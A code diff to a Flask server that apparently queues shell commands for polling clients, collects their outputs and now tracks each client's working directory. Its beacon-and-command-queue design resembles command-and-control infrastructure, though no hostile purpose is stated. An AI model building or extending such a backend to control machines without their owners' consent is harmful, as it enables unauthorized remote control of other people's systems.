@@ -12,6 +12,9 @@ PENDING_COMMANDS = {}
 COMMAND_OUTPUTS = {}
 LAST_SEEN_TIMEOUT = 120 
 
+CLIENT_CWD = {} 
+DEFAULT_CWD = '/' 
+
 def check_auth(req):
     auth_header = req.headers.get('X-API-KEY')
     return auth_header == API_SECRET_KEY
@@ -30,22 +33,41 @@ def status_check():
     user_id = data.get("user_id")
     if user_id:
         CLIENT_STATUS[user_id] = {"ip": data.get("ip"), "status": data.get("status"), "timestamp": time.time()}
+        
+        if user_id not in CLIENT_CWD:
+            CLIENT_CWD[user_id] = DEFAULT_CWD
+        
         return jsonify({"message": "Status received"}), 200
     return jsonify({"error": "Missing user_id"}), 400
 
 @app.route("/get-command", methods=["GET"])
 def get_command():
     user_id = request.args.get("user_id")
+    
     command = PENDING_COMMANDS.pop(user_id, "none")
-    return jsonify({"command": command}), 200
-
+    cwd = CLIENT_CWD.get(user_id, DEFAULT_CWD)
+    
+    response = {"command": command, "cwd": cwd}
+    
+    if command != "none":
+        CLIENT_CWD[user_id] = "PENDING"
+        
+    return jsonify(response), 200
 @app.route("/post-output", methods=["POST"])
 def post_output():
     data = request.json
     user_id = data.get("user_id")
+    
     if user_id:
         output_entry = {"output": data.get("output"), "timestamp": data.get("timestamp")}
         COMMAND_OUTPUTS.setdefault(user_id, []).append(output_entry)
+        new_cwd = data.get("cwd_after_command")
+        if new_cwd and new_cwd != "error":
+            CLIENT_CWD[user_id] = new_cwd
+        elif new_cwd == "error":
+            if CLIENT_CWD.get(user_id) == "PENDING":        
+                 pass 
+
         return jsonify({"message": "Output received"}), 200
     return jsonify({"error": "Missing user_id"}), 400
 
